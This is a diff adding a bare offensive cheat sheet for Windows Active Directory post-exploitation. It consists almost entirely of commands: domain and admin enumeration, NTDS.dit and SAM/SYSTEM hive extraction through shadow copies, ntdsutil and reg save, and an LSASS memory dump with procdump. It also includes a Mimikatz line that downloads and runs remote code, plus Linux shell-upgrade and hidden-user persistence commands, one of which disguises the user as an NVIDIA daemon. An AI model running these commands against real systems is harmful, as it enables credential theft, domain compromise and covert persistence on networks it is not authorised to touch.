@@ -1,0 +1,85 @@
+# tii
+
+# Identify domain
+echo %USERDOMAIN%
+echo %USERDNSDOMAIN%
+systeminfo | findstr /B /C:”Domain”
+echo %logonserver%
+set l
+
+# Identify domain controllers
+net group “Domain Controllers” /domain
+netdom query dc
+netdom query /domain:{DOMAINNAME} DC | WORKSTATION | SERVERS
+nltest /dclist:{domain}
+
+# Identify users
+net users
+net users /domain
+net group "Domain Admins" /domain
+net group "Enterprise Admins" /domain
+
+
+## Extract NTDS
+
+	## Shadow copy (pre 'ntdsutil')
+		# List existing shadow copies
+		vssadmin list shadows
+		# Create shadow copy
+		vssadmin create shadow /for=c:
+		# Copy interesting information
+		copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[x]\Windows\NTDS\NTDS.dit .
+		copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[x]\Windows\System32\config\SECURITY .
+		copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[x]\Windows\System32\config\SAM .
+		copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[x]\Windows\System32\config\SYSTEM .
+		# Clean
+		vssadmin delete shadows /for=c: /oldest /quiet
+		# Copy
+		smbclient '//windowsserver/c$' -c 'lcd /tmp; cd Directory; get file.txt' -U administrator%password
+
+	## NTDSUTIL
+		=> ntdsutil
+		=> ntdsutil: activate instance ntds
+		=> ntdsutil: ifm
+		=> ifm: create full c:\pentest
+		=> ifm: quit
+		=> ntdsutil: quit
+
+		even faster => ntdsutil "act inst ntds" ifm "create full C:\\TEMP\\OUTPUT" q q
+		Reference: http://www.harmj0y.net/blog/redteaming/the-case-of-a-stubborn-ntds-dit/
+
+
+## Extract from registries
+
+	# Extract SAM
+	reg save HKLM\SAM .
+	# Extract SECURITY
+	reg save HKLM\SECURITY .
+	# Extract SYSTEM
+	reg save HKLM\SYSTEM .
+
+	# Get local hash
+	bkhive system syskey
+	samdump2 sam syskey > hash.txt
+
+	# Cached Hash
+	reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v cachedLogonscount
+
+### TIPS
+
+# Copy files with smbclient
+smbclient '//windowsserver/c$' -c 'lcd /tmp; cd Directory; get file.txt' -U administrator%password
+
+# ProcDump
+procdump -accepteula -ma lsass.exe lsass.dmp
+
+# TSE client (cli)
+mstsc.exe
+
+# Mimikatz powershell
+powershell "IEX (New-Object Net.WebClient).DownloadString('http://'); Invoke-Mimikatz -DumpCreds"
+
+### Linux
+python -c 'import pty; pty.spawn("/bin/sh")'
+useradd -r -s /bin/false bob
+useradd -r -M nvidia-persisenced -c "NVIDIA Persistence Daemon"
